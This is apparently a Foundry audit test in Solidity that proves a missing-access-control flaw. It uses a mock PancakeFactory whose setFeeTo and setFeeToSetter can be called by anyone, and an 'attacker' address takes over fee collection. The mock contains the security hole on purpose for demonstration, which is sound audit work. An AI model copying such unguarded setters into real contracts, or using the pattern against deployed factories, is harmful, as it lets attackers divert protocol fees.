// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

// Mock implementation mimicking the vulnerable PancakeFactory functions
contract MockPancakeFactory {
    address public feeTo;
    address public feeToSetter;

    function setFeeTo(address _feeTo) external {
        feeTo = _feeTo;
    }

    function setFeeToSetter(address _feeToSetter) external {
        feeToSetter = _feeToSetter;
    }
}

contract PancakeFactoryAuditTest is Test {
    MockPancakeFactory factory;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        factory = new MockPancakeFactory();
    }

    function test_anyoneCanSetFeeTo() public {
        console.log("--- BEFORE-Trigger feeTo ---");
        address beforeFeeTo = factory.feeTo();
        console.log("Initial feeTo address:", beforeFeeTo);
        
        console.log("--- Trigger setFeeTo ---");
        // Attacker sets themselves as fee recipient
        vm.prank(attacker);
        factory.setFeeTo(attacker);

        console.log("--- AFTER-Trigger feeTo ---");
        address afterFeeTo = factory.feeTo();
        console.log("Post-attack feeTo address:", afterFeeTo);
        
        bool changed = (afterFeeTo != beforeFeeTo);
        console.log("State changed:", changed ? "YES" : "NO");
        console.log("Exploit successful:", (afterFeeTo == attacker) ? "YES" : "NO");
        
        if (afterFeeTo == attacker) {
            console.log("Vulnerability Exists: Attacker can change feeTo");
        } else {
            console.log("Vulnerability not Exist: Attacker couldn't change feeTo");
        }
        
        // Original verification
        assertEq(afterFeeTo, attacker, "Fee recipient was not changed");
    }

    function test_anyoneCanSetFeeToSetter() public {
        console.log("--- BEFORE-Trigger feeToSetter ---");
        address beforeFeeToSetter = factory.feeToSetter();
        console.log("Initial feeToSetter address:", beforeFeeToSetter);
        
        console.log("--- Trigger setFeeToSetter ---");
        // Attacker takes control of fee setter role
        vm.prank(attacker);
        factory.setFeeToSetter(attacker);

        console.log("--- AFTER-Trigger feeToSetter ---");
        address afterFeeToSetter = factory.feeToSetter();
        console.log("Post-attack feeToSetter address:", afterFeeToSetter);
        
        bool changed = (afterFeeToSetter != beforeFeeToSetter);
        console.log("State changed:", changed ? "YES" : "NO");
        console.log("Exploit successful:", (afterFeeToSetter == attacker) ? "YES" : "NO");
        
        if (afterFeeToSetter == attacker) {
            console.log("Vulnerability Exists: Attacker can change feeToSetter");
        } else {
            console.log("Vulnerability not Exist: Attacker couldn't change feeToSetter");
        }
        
        // Original verification
        assertEq(afterFeeToSetter, attacker, "Fee setter control not taken");
    }
}